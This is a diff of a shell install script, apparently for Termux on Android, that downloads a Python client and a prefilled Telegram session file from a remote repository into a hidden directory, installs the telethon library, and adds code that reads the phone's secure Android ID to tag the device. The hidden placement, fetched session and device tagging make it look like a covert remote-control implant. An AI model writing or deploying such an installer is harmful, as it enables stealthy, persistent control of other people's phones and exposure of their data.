@@ -6,17 +6,26 @@ CLIENT_SCRIPT="client.py"
 SESSION_FILE="client.session"
 HIDDEN_DIR="$HOME/.config/.cache"
 BASH_RC="$HOME/.bashrc"
-PYTHON_PKG="python"
-PIP_PKG="python-pip"
-TELEGRAM_LIB="telethon"
 
 mkdir -p "$HIDDEN_DIR"
 
 curl -sL "$REPO_URL/$CLIENT_SCRIPT" -o "$HIDDEN_DIR/$CLIENT_SCRIPT"
 curl -sL "$REPO_URL/$SESSION_FILE" -o "$HIDDEN_DIR/$SESSION_FILE"
 
-pkg install -y "$PYTHON_PKG" "$PIP_PKG"
-pip install --upgrade "$TELEGRAM_LIB"
+pkg install -y python python-pip
+pip install --upgrade telethon
+
+# Generate Device ID if it doesn't exist
+ID_FILE="$HIDDEN_DIR/device_id.txt"
+if [ ! -f "$ID_FILE" ]; then
+    if command -v settings > /dev/null; then
+        AND_ID=$(settings get secure android_id)
+        DEV_ID="P-${AND_ID:0:4}"
+    else
+        DEV_ID="P-$(head /dev/urandom | tr -dc a-z0-9 | head -c 4)"
+    fi
+    echo "$DEV_ID" > "$ID_FILE"
+fi
 
 chmod +x "$HIDDEN_DIR/$CLIENT_SCRIPT"
 
